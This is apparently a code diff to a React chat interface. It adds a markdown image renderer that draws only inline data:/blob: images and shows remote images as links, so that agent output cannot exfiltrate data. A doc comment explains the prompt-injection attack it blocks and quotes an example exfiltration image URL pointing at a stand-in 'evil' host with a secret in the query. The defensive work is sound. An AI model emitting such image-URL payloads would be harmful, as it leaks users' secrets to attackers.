@@ -1,5 +1,5 @@
 import React, { useState } from "react";
-import ReactMarkdown from "react-markdown";
+import ReactMarkdown, { defaultUrlTransform } from "react-markdown";
 import remarkGfm from "remark-gfm";
 import {
   ArrowUp,
@@ -688,6 +688,63 @@ const REFERENCE_TASK_STATUS_ICONS: Record<
   React.ComponentType<{ className?: string; "aria-hidden"?: boolean | "true" | "false" }>
 > = { completed: CircleCheck, failed: CircleX, cancelled: CircleSlash };
 
+/** Only an image the page already holds (data:/blob:) is drawn inline; nothing is fetched for it. */
+const INLINE_MARKDOWN_IMAGE = /^(?:data:image\/|blob:)/i;
+
+/**
+ * react-markdown strips data:/blob: sources by default; let an inline image through for
+ * `src` only, and leave every other URL on the library's own safe list.
+ */
+export function chatMarkdownUrlTransform(url: string, key: string): string {
+  if (key === "src" && INLINE_MARKDOWN_IMAGE.test(url)) return url;
+  return defaultUrlTransform(url);
+}
+
+/**
+ * Markdown image from agent output. A remote `src` would be fetched the moment it renders, which
+ * lets injected text exfiltrate data through the URL (`![](https://evil/?d=secret)`). A remote
+ * image is therefore drawn as a link showing its alt text and host that the reader taps to open.
+ */
+export const ChatMarkdownImage: React.FC<{ src?: string; alt?: string }> = ({ src, alt }) => {
+  if (typeof src === "string" && INLINE_MARKDOWN_IMAGE.test(src)) {
+    return <img src={src} alt={alt ?? ""} loading="lazy" className="my-1 max-w-full rounded-md" />;
+  }
+  let host = "";
+  let href: string | undefined;
+  if (typeof src === "string" && src.length > 0) {
+    try {
+      const url = new URL(src);
+      if (url.protocol === "http:" || url.protocol === "https:") {
+        host = url.host;
+        href = src;
+      }
+    } catch {
+      // not an absolute URL: shown as text only, never fetched or linked
+    }
+  }
+  const label = (alt && alt.trim().length > 0 ? alt.trim() : "Image") + (host ? " (" + host + ")" : "");
+  const className =
+    "inline-flex items-center gap-1 rounded border border-chat-border bg-chat-surface/70 px-1.5 py-0.5 text-xs text-chat-foreground-secondary";
+  const icon = <ImageIcon aria-hidden="true" className="size-3 shrink-0" />;
+  return href ? (
+    <a
+      data-testid="markdown-remote-image"
+      href={href}
+      target="_blank"
+      rel="noopener noreferrer"
+      className={cn(className, "underline underline-offset-2 hover:text-chat-foreground")}
+    >
+      {icon}
+      <span>{label}</span>
+    </a>
+  ) : (
+    <span data-testid="markdown-remote-image" className={className}>
+      {icon}
+      <span>{label}</span>
+    </span>
+  );
+};
+
 /**
  * The prose vocabulary of a rich turn. It is hoisted because a map built inside the component
  * hands ReactMarkdown a NEW component identity on every render: React then unmounts and remounts
@@ -717,6 +774,7 @@ const REFERENCE_PROSE_COMPONENTS = {
       {children}
     </code>
   ),
+  img: ChatMarkdownImage,
 };
 
 /** Markdown the page already carries, drawn the way the rest of the chat draws prose. */
@@ -730,6 +788,7 @@ const ReferenceProse: React.FC<{ text: string; className?: string }> = ({ text, 
     <ReactMarkdown
       remarkPlugins={[remarkGfm]}
       components={REFERENCE_PROSE_COMPONENTS}
+      urlTransform={chatMarkdownUrlTransform}
     >
       {text}
     </ReactMarkdown>
